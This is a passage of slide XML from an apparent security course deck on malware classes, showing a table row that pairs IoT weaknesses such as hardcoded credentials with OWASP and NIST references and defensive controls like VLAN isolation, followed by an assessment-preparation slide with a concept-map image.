                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>SBOM; build environment security</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="305921">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>IoT Security</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Hardcoded credentials; no EDR capability</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>OWASP IoT Top 10; NIST IR 8259A</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>VLAN isolation; firmware update enforcement</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>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Consolidated Key Concepts &amp; Assessment Preparation (2/2)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="16_consolidated_concept_map.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Class 16 consolidated concept map, all malware classes, their relationships, and associated defensive controls in a single reference view</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